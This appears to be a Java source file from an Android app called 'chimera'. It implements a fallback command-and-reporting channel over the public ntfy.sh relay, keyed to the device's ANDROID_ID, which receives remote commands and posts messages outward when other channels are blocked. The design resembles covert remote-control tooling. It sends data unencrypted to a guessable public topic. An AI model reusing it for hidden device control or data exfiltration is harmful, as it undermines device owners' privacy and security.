package com.chimera;

import android.content.Context;
import android.provider.Settings;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Ntfy.sh free relay (ntfy.sh) - no domain owned, ephemeral WebSocket polling
 * Used as tertiary when Firestore/Telegram/MQTT blocked (censorship)
 * Poll interval 60s, ETag gated, only when NetworkStateMonitor USABLE
 */
public class NtfyTransport implements Transport {
    private Thread pollThread;
    private volatile boolean running = false;
    private String lastEtag = "";

    @Override public String name() { return "ntfy"; }

    @Override public boolean isHealthy(Context ctx) { return NetworkStateMonitor.canAttemptHeartbeat(ctx); }

    @Override public void start(Context ctx) {
        if (running) return;
        if (!isHealthy(ctx)) return;
        running = true;
        pollThread = new Thread(() -> {
            while (running && !Thread.currentThread().isInterrupted()) {
                try {
                    if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) { Thread.sleep(60000); continue; }
                    String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                    String topic = "chimera-" + androidId; // unique per device, admin knows androidId via Firestore presence
                    String urlStr = "https://ntfy.sh/" + topic + "/json?since=all";
                    HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(60000);
                    if (lastEtag != null && !lastEtag.isEmpty()) conn.setRequestProperty("If-None-Match", lastEtag);
                    int code = conn.getResponseCode();
                    if (code == 304) { Thread.sleep(60000); continue; }
                    if (code == 200) {
                        lastEtag = conn.getHeaderField("ETag");
                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        String line;
                        while ((line = br.readLine()) != null && running) {
                            if (line.contains("\"message\":")) {
                                // naive parse
                                int s = line.indexOf("\"message\":\"") + 11;
                                int e = line.indexOf("\"", s);
                                if (s>11 && e> s) {
                                    String msg = line.substring(s,e);
                                    if ("switch_client".equals(msg)) TransportManager.switchToClientProtocol(ctx);
                                }
                            }
                        }
                    }
                    Thread.sleep(60000);
                } catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                catch (Exception e) { ErrorLogger.logError(ctx, "Ntfy_poll", e); try{Thread.sleep(60000);}catch(Exception ignored){} }
            }
        });
        pollThread.start();
    }

    @Override public void send(String message, Context ctx) {
        if (!NetworkStateMonitor.canAttemptHeartbeat(ctx)) return;
        new Thread(() -> {
            try {
                String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                String topic = "chimera-" + androidId;
                String urlStr = "https://ntfy.sh/" + topic;
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(message.getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { ErrorLogger.logError(ctx, "Ntfy_send", e); }
        }).start();
    }

    @Override public void stop() { running=false; if(pollThread!=null) pollThread.interrupt(); }
}
